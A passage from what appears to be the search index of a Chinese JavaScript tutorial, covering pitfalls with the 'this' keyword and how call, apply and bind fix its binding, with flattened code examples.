: { m : function () { console . log ( this . p ); }, p : 'Hello' } }; \u5982\u679c\u8fd9\u65f6\u5c06\u5d4c\u5957\u5bf9\u8c61\u5185\u90e8\u7684\u65b9\u6cd5\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf\uff0c this \u4f9d\u7136\u4f1a\u6307\u5411\u5168\u5c40\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 var a = { b : { m : function () { console . log ( this . p ); }, p : 'Hello' } }; var hello = a . b . m ; hello () // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c m \u662f\u591a\u5c42\u5bf9\u8c61\u5185\u90e8\u7684\u4e00\u4e2a\u65b9\u6cd5\u3002\u4e3a\u6c42\u7b80\u4fbf\uff0c\u5c06\u5176\u8d4b\u503c\u7ed9 hello \u53d8\u91cf\uff0c\u7ed3\u679c\u8c03\u7528\u65f6\uff0c this \u6307\u5411\u4e86\u9876\u5c42\u5bf9\u8c61\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u53ea\u5c06 m \u6240\u5728\u7684\u5bf9\u8c61\u8d4b\u503c\u7ed9 hello \uff0c\u8fd9\u6837\u8c03\u7528\u65f6\uff0c this \u7684\u6307\u5411\u5c31\u4e0d\u4f1a\u53d8\u3002 1 2 var hello = a . b ; hello . m () // Hello","title":"\u4f7f\u7528\u573a\u5408"},{"location":"oop/this/#_4","text":"","title":"\u4f7f\u7528\u6ce8\u610f\u70b9"},{"location":"oop/this/#this_1","text":"\u7531\u4e8e this \u7684\u6307\u5411\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u6240\u4ee5\u5207\u52ff\u5728\u51fd\u6570\u4e2d\u5305\u542b\u591a\u5c42\u7684 this \u3002 1 2 3 4 5 6 7 8 9 10 11 12 var o = { f1 : function () { console . log ( this ); var f2 = function () { console . log ( this ); }(); } } o . f1 () // Object // Window \u4e0a\u9762\u4ee3\u7801\u5305\u542b\u4e24\u5c42 this \uff0c\u7ed3\u679c\u8fd0\u884c\u540e\uff0c\u7b2c\u4e00\u5c42\u6307\u5411\u5bf9\u8c61 o \uff0c\u7b2c\u4e8c\u5c42\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u56e0\u4e3a\u5b9e\u9645\u6267\u884c\u7684\u662f\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 8 9 10 var temp = function () { console . log ( this ); }; var o = { f1 : function () { console . log ( this ); var f2 = temp (); } } \u4e00\u4e2a\u89e3\u51b3\u65b9\u6cd5\u662f\u5728\u7b2c\u4e8c\u5c42\u6539\u7528\u4e00\u4e2a\u6307\u5411\u5916\u5c42 this \u7684\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var o = { f1 : function () { console . log ( this ); var that = this ; var f2 = function () { console . log ( that ); }(); } } o . f1 () // Object // Object \u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u53d8\u91cf that \uff0c\u56fa\u5b9a\u6307\u5411\u5916\u5c42\u7684 this \uff0c\u7136\u540e\u5728\u5185\u5c42\u4f7f\u7528 that \uff0c\u5c31\u4e0d\u4f1a\u53d1\u751f this \u6307\u5411\u7684\u6539\u53d8\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u4f7f\u7528\u4e00\u4e2a\u53d8\u91cf\u56fa\u5b9a this \u7684\u503c\uff0c\u7136\u540e\u5185\u5c42\u51fd\u6570\u8c03\u7528\u8fd9\u4e2a\u53d8\u91cf\uff0c\u662f\u975e\u5e38\u5e38\u89c1\u7684\u505a\u6cd5\uff0c\u8bf7\u52a1\u5fc5\u638c\u63e1\u3002 JavaScript \u63d0\u4f9b\u4e86\u4e25\u683c\u6a21\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u786c\u6027\u907f\u514d\u8fd9\u79cd\u95ee\u9898\u3002\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u5982\u679c\u51fd\u6570\u5185\u90e8\u7684 this \u6307\u5411\u9876\u5c42\u5bf9\u8c61\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 var counter = { count : 0 }; counter . inc = function () { 'use strict' ; this . count ++ }; var f = counter . inc ; f () // TypeError: Cannot read property 'count' of undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c inc \u65b9\u6cd5\u901a\u8fc7 'use strict' \u58f0\u660e\u91c7\u7528\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd9\u65f6\u5185\u90e8\u7684 this \u4e00\u65e6\u6307\u5411\u9876\u5c42\u5bf9\u8c61\uff0c\u5c31\u4f1a\u62a5\u9519\u3002","title":"\u907f\u514d\u591a\u5c42 this"},{"location":"oop/this/#this_2","text":"\u6570\u7ec4\u7684 map \u548c foreach \u65b9\u6cd5\uff0c\u5141\u8bb8\u63d0\u4f9b\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u3002\u8fd9\u4e2a\u51fd\u6570\u5185\u90e8\u4e0d\u5e94\u8be5\u4f7f\u7528 this \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var o = { v : 'hello' , p : [ 'a1' , 'a2' ], f : function f () { this . p . forEach ( function ( item ) { console . log ( this . v + ' ' + item ); }); } } o . f () // undefined a1 // undefined a2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c foreach \u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u4e2d\u7684 this \uff0c\u5176\u5b9e\u662f\u6307\u5411 window \u5bf9\u8c61\uff0c\u56e0\u6b64\u53d6\u4e0d\u5230 o.v \u7684\u503c\u3002\u539f\u56e0\u8ddf\u4e0a\u4e00\u6bb5\u7684\u591a\u5c42 this \u662f\u4e00\u6837\u7684\uff0c\u5c31\u662f\u5185\u5c42\u7684 this \u4e0d\u6307\u5411\u5916\u90e8\uff0c\u800c\u6307\u5411\u9876\u5c42\u5bf9\u8c61\u3002 \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u5c31\u662f\u524d\u9762\u63d0\u5230\u7684\uff0c\u4f7f\u7528\u4e2d\u95f4\u53d8\u91cf\u56fa\u5b9a this \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var o = { v : 'hello' , p : [ 'a1' , 'a2' ], f : function f () { var that = this ; this . p . forEach ( function ( item ) { console . log ( that . v + ' ' + item ); }); } } o . f () // hello a1 // hello a2 \u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u5c06 this \u5f53\u4f5c foreach \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u56fa\u5b9a\u5b83\u7684\u8fd0\u884c\u73af\u5883\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var o = { v : 'hello' , p : [ 'a1' , 'a2' ], f : function f () { this . p . forEach ( function ( item ) { console . log ( this . v + ' ' + item ); }, this ); } } o . f () // hello a1 // hello a2","title":"\u907f\u514d\u6570\u7ec4\u5904\u7406\u65b9\u6cd5\u4e2d\u7684 this"},{"location":"oop/this/#this_3","text":"\u56de\u8c03\u51fd\u6570\u4e2d\u7684 this \u5f80\u5f80\u4f1a\u6539\u53d8\u6307\u5411\uff0c\u6700\u597d\u907f\u514d\u4f7f\u7528\u3002 1 2 3 4 5 6 7 var o = new Object (); o . f = function () { console . log ( this === o ); } // jQuery \u7684\u5199\u6cd5 $ ( '#button' ). on ( 'click' , o . f ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u6309\u94ae\u4ee5\u540e\uff0c\u63a7\u5236\u53f0\u4f1a\u663e\u793a false \u3002\u539f\u56e0\u662f\u6b64\u65f6 this \u4e0d\u518d\u6307\u5411 o \u5bf9\u8c61\uff0c\u800c\u662f\u6307\u5411\u6309\u94ae\u7684 DOM \u5bf9\u8c61\uff0c\u56e0\u4e3a f \u65b9\u6cd5\u662f\u5728\u6309\u94ae\u5bf9\u8c61\u7684\u73af\u5883\u4e2d\u88ab\u8c03\u7528\u7684\u3002\u8fd9\u79cd\u7ec6\u5fae\u7684\u5dee\u522b\uff0c\u5f88\u5bb9\u6613\u5728\u7f16\u7a0b\u4e2d\u5ffd\u89c6\uff0c\u5bfc\u81f4\u96be\u4ee5\u5bdf\u89c9\u7684\u9519\u8bef\u3002 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u4e00\u4e9b\u65b9\u6cd5\u5bf9 this \u8fdb\u884c\u7ed1\u5b9a\uff0c\u4e5f\u5c31\u662f\u4f7f\u5f97 this \u56fa\u5b9a\u6307\u5411\u67d0\u4e2a\u5bf9\u8c61\uff0c\u51cf\u5c11\u4e0d\u786e\u5b9a\u6027\u3002","title":"\u907f\u514d\u56de\u8c03\u51fd\u6570\u4e2d\u7684 this"},{"location":"oop/this/#this_4","text":"this \u7684\u52a8\u6001\u5207\u6362\uff0c\u56fa\u7136\u4e3a JavaScript \u521b\u9020\u4e86\u5de8\u5927\u7684\u7075\u6d3b\u6027\uff0c\u4f46\u4e5f\u4f7f\u5f97\u7f16\u7a0b\u53d8\u5f97\u56f0\u96be\u548c\u6a21\u7cca\u3002\u6709\u65f6\uff0c\u9700\u8981\u628a this \u56fa\u5b9a\u4e0b\u6765\uff0c\u907f\u514d\u51fa\u73b0\u610f\u60f3\u4e0d\u5230\u7684\u60c5\u51b5\u3002JavaScript \u63d0\u4f9b\u4e86 call \u3001 apply \u3001 bind \u8fd9\u4e09\u4e2a\u65b9\u6cd5\uff0c\u6765\u5207\u6362/\u56fa\u5b9a this \u7684\u6307\u5411\u3002","title":"\u7ed1\u5b9a this \u7684\u65b9\u6cd5"},{"location":"oop/this/#functionprototypecall","text":"\u51fd\u6570\u5b9e\u4f8b\u7684 call \u65b9\u6cd5\uff0c\u53ef\u4ee5\u6307\u5b9a\u51fd\u6570\u5185\u90e8 this \u7684\u6307\u5411\uff08\u5373\u51fd\u6570\u6267\u884c\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\uff09\uff0c\u7136\u540e\u5728\u6240\u6307\u5b9a\u7684\u4f5c\u7528\u57df\u4e2d\uff0c\u8c03\u7528\u8be5\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 var obj = {}; var f = function () { return this ; }; f () === window // true f . call ( obj ) === obj // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5168\u5c40\u73af\u5883\u8fd0\u884c\u51fd\u6570 f \u65f6\uff0c this \u6307\u5411\u5168\u5c40\u73af\u5883\uff08\u6d4f\u89c8\u5668\u4e3a window \u5bf9\u8c61\uff09\uff1b call \u65b9\u6cd5\u53ef\u4ee5\u6539\u53d8 this \u7684\u6307\u5411\uff0c\u6307\u5b9a this \u6307\u5411\u5bf9\u8c61 obj \uff0c\u7136\u540e\u5728\u5bf9\u8c61 obj \u7684\u4f5c\u7528\u57df\u4e2d\u8fd0\u884c\u51fd\u6570 f \u3002 call \u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u5e94\u8be5\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002\u5982\u679c\u53c2\u6570\u4e3a\u7a7a\u3001 null \u548c undefined \uff0c\u5219\u9ed8\u8ba4\u4f20\u5165\u5168\u5c40\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var n = 123 ; var obj = { n : 456 }; function a () { console . log ( this . n ); } a . call () // 123 a . call ( null ) // 123 a . call ( undefined ) // 123 a . call ( window ) // 123 a . call ( obj ) // 456 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u51fd\u6570\u4e2d\u7684 this \u5173\u952e\u5b57\uff0c\u5982\u679c\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u8fd4\u56de\u7ed3\u679c\u4e3a 123 \u3002\u5982\u679c\u4f7f\u7528 call \u65b9\u6cd5\u5c06 this \u5173\u952e\u5b57\u6307\u5411 obj \u5bf9\u8c61\uff0c\u8fd4\u56de\u7ed3\u679c\u4e3a 456 \u3002\u53ef\u4ee5\u770b\u5230\uff0c\u5982\u679c call \u65b9\u6cd5\u6ca1\u6709\u53c2\u6570\uff0c\u6216\u8005\u53c2\u6570\u4e3a null \u6216 undefined \uff0c\u5219\u7b49\u540c\u4e8e\u6307\u5411\u5168\u5c40\u5bf9\u8c61\u3002 \u5982\u679c call \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u539f\u59cb\u503c\uff0c\u90a3\u4e48\u8fd9\u4e2a\u539f\u59cb\u503c\u4f1a\u81ea\u52a8\u8f6c\u6210\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\uff0c\u7136\u540e\u4f20\u5165 call \u65b9\u6cd5\u3002 1 2 3 4 5 6 var f = function () { return this ; }; f . call ( 5 ) // Number {[[PrimitiveValue]]: 5} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c call \u7684\u53c2\u6570\u4e3a 5 \uff0c\u4e0d\u662f\u5bf9\u8c61\uff0c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u6210\u5305\u88c5\u5bf9\u8c61\uff08 Number \u7684\u5b9e\u4f8b\uff09\uff0c\u7ed1\u5b9a f \u5185\u90e8\u7684 this \u3002 call \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a\u53c2\u6570\u3002 1 func . call ( thisValue , arg1 , arg2 , ...) call \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u662f this \u6240\u8981\u6307\u5411\u7684\u90a3\u4e2a\u5bf9\u8c61\uff0c\u540e\u9762\u7684\u53c2\u6570\u5219\u662f\u51fd\u6570\u8c03\u7528\u65f6\u6240\u9700\u7684\u53c2\u6570\u3002 1 2 3 4 5 function add ( a , b ) { return a + b ; } add . call ( this , 1 , 2 ) // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c call \u65b9\u6cd5\u6307\u5b9a\u51fd\u6570 add \u5185\u90e8\u7684 this \u7ed1\u5b9a\u5f53\u524d\u73af\u5883\uff08\u5bf9\u8c61\uff09\uff0c\u5e76\u4e14\u53c2\u6570\u4e3a 1 \u548c 2 \uff0c\u56e0\u6b64\u51fd\u6570 add \u8fd0\u884c\u540e\u5f97\u5230 3 \u3002 call \u65b9\u6cd5\u7684\u4e00\u4e2a\u5e94\u7528\u662f\u8c03\u7528\u5bf9\u8c61\u7684\u539f\u751f\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 var obj = {}; obj . hasOwnProperty ( 'toString' ) // false // \u8986\u76d6\u6389\u7ee7\u627f\u7684 hasOwnProperty \u65b9\u6cd5 obj . hasOwnProperty = function () { return true ; }; obj . hasOwnProperty ( 'toString' ) // true Object . prototype . hasOwnProperty . call ( obj , 'toString' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c hasOwnProperty \u662f obj \u5bf9\u8c61\u7ee7\u627f\u7684\u65b9\u6cd5\uff0c\u5982\u679c\u8fd9\u4e2a\u65b9\u6cd5\u4e00\u65e6\u88ab\u8986\u76d6\uff0c\u5c31\u4e0d\u4f1a\u5f97\u5230\u6b63\u786e\u7ed3\u679c\u3002 call \u65b9\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5b83\u5c06 hasOwnProperty \u65b9\u6cd5\u7684\u539f\u59cb\u5b9a\u4e49\u653e\u5230 obj \u5bf9\u8c61\u4e0a\u6267\u884c\uff0c\u8fd9\u6837\u65e0\u8bba obj \u4e0a\u6709\u6ca1\u6709\u540c\u540d\u65b9\u6cd5\uff0c\u90fd\u4e0d\u4f1a\u5f71\u54cd\u7ed3\u679c\u3002","title":"Function.prototype.call()"},{"location":"oop/this/#functionprototypeapply","text":"apply \u65b9\u6cd5\u7684\u4f5c\u7528\u4e0e call \u65b9\u6cd5\u7c7b\u4f3c\uff0c\u4e5f\u662f\u6539\u53d8 this \u6307\u5411\uff0c\u7136\u540e\u518d\u8c03\u7528\u8be5\u51fd\u6570\u3002\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u6570\u7ec4\u4f5c\u4e3a\u51fd\u6570\u6267\u884c\u65f6\u7684\u53c2\u6570\uff0c\u4f7f\u7528\u683c\u5f0f\u5982\u4e0b\u3002 1 func . apply ( thisValue , [ arg1 , arg2 , ...]) apply \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e5f\u662f this \u6240\u8981\u6307\u5411\u7684\u90a3\u4e2a\u5bf9\u8c61\uff0c\u5982\u679c\u8bbe\u4e3a null \u6216 undefined \uff0c\u5219\u7b49\u540c\u4e8e\u6307\u5b9a\u5168\u5c40\u5bf9\u8c61\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u8be5\u6570\u7ec4\u7684\u6240\u6709\u6210\u5458\u4f9d\u6b21\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f20\u5165\u539f\u51fd\u6570\u3002\u539f\u51fd\u6570\u7684\u53c2\u6570\uff0c\u5728 call \u65b9\u6cd5\u4e2d\u5fc5\u987b\u4e00\u4e2a\u4e2a\u6dfb\u52a0\uff0c\u4f46\u662f\u5728 apply \u65b9\u6cd5\u4e2d\uff0c\u5fc5\u987b\u4ee5\u6570\u7ec4\u5f62\u5f0f\u6dfb\u52a0\u3002 1 2 3 4 5 6 function f ( x , y ){ console . log ( x + y ); } f . call ( null , 1 , 1 ) // 2 f . apply ( null , [ 1 , 1 ]) // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c f \u51fd\u6570\u672c\u6765\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u4f7f\u7528 apply \u65b9\u6cd5\u4ee5\u540e\uff0c\u5c31\u53d8\u6210\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\u3002 \u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u505a\u4e00\u4e9b\u6709\u8da3\u7684\u5e94\u7528\u3002 \uff081\uff09\u627e\u51fa\u6570\u7ec4\u6700\u5927\u5143\u7d20 JavaScript \u4e0d\u63d0\u4f9b\u627e\u51fa\u6570\u7ec4\u6700\u5927\u5143\u7d20\u7684\u51fd\u6570\u3002\u7ed3\u5408\u4f7f\u7528 apply \u65b9\u6cd5\u548c Math.max \u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u8fd4\u56de\u6570\u7ec4\u7684\u6700\u5927\u5143\u7d20\u3002 1 2 var a = [ 10 , 2 , 4 , 15 , 9 ]; Math . max . apply ( null , a ) // 15 \uff082\uff09\u5c06\u6570\u7ec4\u7684\u7a7a\u5143\u7d20\u53d8\u4e3a undefined \u901a\u8fc7 apply \u65b9\u6cd5\uff0c\u5229\u7528 Array \u6784\u9020\u51fd\u6570\u5c06\u6570\u7ec4\u7684\u7a7a\u5143\u7d20\u53d8\u6210 undefined \u3002 1 2 Array . apply ( null , [ 'a' , , 'b' ]) // [ 'a', undefined, 'b' ] \u7a7a\u5143\u7d20\u4e0e undefined \u7684\u5dee\u522b\u5728\u4e8e\uff0c\u6570\u7ec4\u7684 forEach \u65b9\u6cd5\u4f1a\u8df3\u8fc7\u7a7a\u5143\u7d20\uff0c\u4f46\u662f\u4e0d\u4f1a\u8df3\u8fc7 undefined \u3002\u56e0\u6b64\uff0c\u904d\u5386\u5185\u90e8\u5143\u7d20\u7684\u65f6\u5019\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var a = [ 'a' , , 'b' ]; function print ( i ) { console . log ( i ); } a . forEach ( print ) // a // b Array . apply ( null , a ). forEach ( print ) // a // undefined // b \uff083\uff09\u8f6c\u6362\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61 \u53e6\u5916\uff0c\u5229\u7528\u6570\u7ec4\u5bf9\u8c61\u7684 slice \u65b9\u6cd5\uff0c\u53ef\u4ee5\u5c06\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08\u6bd4\u5982 arguments \u5bf9\u8c61\uff09\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002 1 2 3 4 Array . prototype . slice . apply ({ 0 : 1 , length : 1 }) // [1] Array . prototype . slice . apply ({ 0 : 1 }) // [] Array . prototype . slice . apply ({ 0 : 1 , length : 2 }) // [1, undefined] Array . prototype . slice . apply ({ length : 1 }) // [undefined] \u4e0a\u9762\u4ee3\u7801\u7684 apply \u65b9\u6cd5\u7684\u53c2\u6570\u90fd\u662f\u5bf9\u8c61\uff0c\u4f46\u662f\u8fd4\u56de\u7ed3\u679c\u90fd\u662f\u6570\u7ec4\uff0c\u8fd9\u5c31\u8d77\u5230\u4e86\u5c06\u5bf9\u8c61\u8f6c\u6210\u6570\u7ec4\u7684\u76ee\u7684\u3002\u4ece\u4e0a\u9762\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u8d77\u4f5c\u7528\u7684\u524d\u63d0\u662f\uff0c\u88ab\u5904\u7406\u7684\u5bf9\u8c61\u5fc5\u987b\u6709 length \u5c5e\u6027\uff0c\u4ee5\u53ca\u76f8\u5bf9\u5e94\u7684\u6570\u5b57\u952e\u3002 \uff084\uff09\u7ed1\u5b9a\u56de\u8c03\u51fd\u6570\u7684\u5bf9\u8c61 \u524d\u9762\u7684\u6309\u94ae\u70b9\u51fb\u4e8b\u4ef6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u6539\u5199\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var o = new Object (); o . f = function () { console . log ( this === o ); } var f = function (){ o . f . apply ( o ); // \u6216\u8005 o.f.call(o); }; // jQuery \u7684\u5199\u6cd5 $ ( '#button' ). on ( 'click' , f ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u6309\u94ae\u4ee5\u540e\uff0c\u63a7\u5236\u53f0\u5c06\u4f1a\u663e\u793a true \u3002\u7531\u4e8e apply() \u65b9\u6cd5\uff08\u6216\u8005 call() \u65b9\u6cd5\uff09\u4e0d\u4ec5\u7ed1\u5b9a\u51fd\u6570\u6267\u884c\u65f6\u6240\u5728\u7684\u5bf9\u8c61\uff0c\u8fd8\u4f1a\u7acb\u5373\u6267\u884c\u51fd\u6570\uff0c\u56e0\u6b64\u4e0d\u5f97\u4e0d\u628a\u7ed1\u5b9a\u8bed\u53e5\u5199\u5728\u4e00\u4e2a\u51fd\u6570\u4f53\u5185\u3002\u66f4\u7b80\u6d01\u7684\u5199\u6cd5\u662f\u91c7\u7528\u4e0b\u9762\u4ecb\u7ecd\u7684 bind() \u65b9\u6cd5\u3002","title":"Function.prototype.apply()"},{"location":"oop/this/#functionprototypebind","text":"bind() \u65b9\u6cd5\u7528\u4e8e\u5c06\u51fd\u6570\u4f53\u5185\u7684 this \u7ed1\u5b9a\u5230\u67d0\u4e2a\u5bf9\u8c61\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u51fd\u6570\u3002 1 2 3 4 5 var d = new Date (); d . getTime () // 1481869925657 var print = d . getTime ; print () // Uncaught TypeError: this is not a Date object. \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u5c06 d.getTime() \u65b9\u6cd5\u8d4b\u7ed9\u53d8\u91cf print \uff0c\u7136\u540e\u8c03\u7528 print() \u5c31\u62a5\u9519\u4e86\u3002\u8fd9\u662f\u56e0\u4e3a getTime() \u65b9\u6cd5\u5185\u90e8\u7684 this \uff0c\u7ed1\u5b9a Date \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u8d4b\u7ed9\u53d8\u91cf print \u4ee5\u540e\uff0c\u5185\u90e8\u7684 this \u5df2\u7ecf\u4e0d\u6307\u5411 Date \u5bf9\u8c61\u7684\u5b9e\u4f8b\u4e86\u3002 bind() \u65b9\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 1 2 var print = d . getTime . bind ( d ); print () // 1481869925657 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c bind() \u65b9\u6cd5\u5c06 getTime() \u65b9\u6cd5\u5185\u90e8\u7684 this \u7ed1\u5b9a\u5230 d \u5bf9\u8c61\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u5b89\u5168\u5730\u5c06\u8fd9\u4e2a\u65b9\u6cd5\u8d4b\u503c\u7ed9\u5176\u4ed6\u53d8\u91cf\u4e86\u3002 bind \u65b9\u6cd5\u7684\u53c2\u6570\u5c31\u662f\u6240\u8981\u7ed1\u5b9a this \u7684\u5bf9\u8c61\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u6e05\u6670\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 var counter = { count : 0 , inc : function () { this . count ++ ; } }; var func = counter . inc . bind ( counter ); func (); counter . count // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c counter.inc() \u65b9\u6cd5\u88ab\u8d4b\u503c\u7ed9\u53d8\u91cf func \u3002\u8fd9\u65f6\u5fc5\u987b\u7528 bind() \u65b9\u6cd5\u5c06 inc() \u5185\u90e8\u7684 this \uff0c\u7ed1\u5b9a\u5230 counter \uff0c\u5426\u5219\u5c31\u4f1a\u51fa\u9519\u3002 this \u7ed1\u5b9a\u5230\u5176\u4ed6\u5bf9\u8c61\u4e5f\u662f\u53ef\u4ee5\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var counter = { count : 0 , inc : function () { this . count ++ ; } }; var obj = { count : 100 }; var func = counter . inc . bind ( obj ); func (); obj . count // 101 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c bind() \u65b9\u6cd5\u5c06 inc() \u65b9\u6cd5\u5185\u90e8\u7684 this \uff0c\u7ed1\u5b9a\u5230 obj \u5bf9\u8c61\u3002\u7ed3\u679c\u8c03\u7528 func \u51fd\u6570\u4ee5\u540e\uff0c\u9012\u589e\u7684\u5c31\u662f obj \u5185\u90e8\u7684 count \u5c5e\u6027\u3002 bind() \u8fd8\u53ef\u4ee5\u63a5\u53d7\u66f4\u591a\u7684\u53c2\u6570\uff0c\u5c06\u8fd9\u4e9b\u53c2\u6570\u7ed1\u5b9a\u539f\u51fd\u6570\u7684\u53c2\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 var add = function ( x , y ) { return x * this . m + y * this . n ; } var obj = { m : 2 , n : 2 }; var newAdd = add . bind ( obj , 5 ); newAdd ( 5 ) // 20 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c bind() \u65b9\u6cd5\u9664\u4e86\u7ed1\u5b9a this \u5bf9\u8c61\uff0c\u8fd8\u5c06 add() \u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 x \u7ed1\u5b9a\u6210 5 \uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u51fd\u6570 newAdd() \uff0c\u8fd9\u4e2a\u51fd\u6570\u53ea\u8981\u518d\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570 y \u5c31\u80fd\u8fd0\u884c\u4e86\u3002 \u5982\u679c bind() \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f null \u6216 undefined \uff0c\u7b49\u4e8e\u5c06 this \u7ed1\u5b9a\u5230\u5168\u5c40\u5bf9\u8c61\uff0c\u51fd\u6570\u8fd0\u884c\u65f6 this \u6307\u5411\u9876\u5c42\u5bf9\u8c61\uff08\u6d4f\u89c8\u5668\u4e3a window \uff09\u3002 1 2 3 4 5 6 function add ( x , y ) { return x + y ; } var plus5 = add . bind ( null , 5 ); plus5 ( 10 ) // 15 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 add() \u5185\u90e8\u5e76\u6ca1\u6709 this \uff0c\u4f7f\u7528 bind() \u65b9\u6cd5\u7684\u4e3b\u8981\u76ee\u7684\u662f\u7ed1\u5b9a\u53c2\u6570 x \uff0c\u4ee5\u540e\u6bcf\u6b21\u8fd0\u884c\u65b0\u51fd\u6570 plus5() \uff0c\u5c31\u53ea\u9700\u8981\u63d0\u4f9b\u53e6\u4e00\u4e2a\u53c2\u6570 y \u5c31\u591f\u4e86\u3002\u800c\u4e14\u56e0\u4e3a add() \u5185\u90e8\u6ca1\u6709 this \uff0c\u6240\u4ee5 bind() \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f null \uff0c\u4e0d\u8fc7\u8fd9\u91cc\u5982\u679c\u662f\u5176\u4ed6\u5bf9\u8c61\uff0c\u4e5f\u6ca1\u6709\u5f71\u54cd\u3002 bind() \u65b9\u6cd5\u6709\u4e00\u4e9b\u4f7f\u7528\u6ce8\u610f\u70b9\u3002 \uff081\uff09\u6bcf\u4e00\u6b21\u8fd4\u56de\u4e00\u4e2a\u65b0\u51fd\u6570 bind() 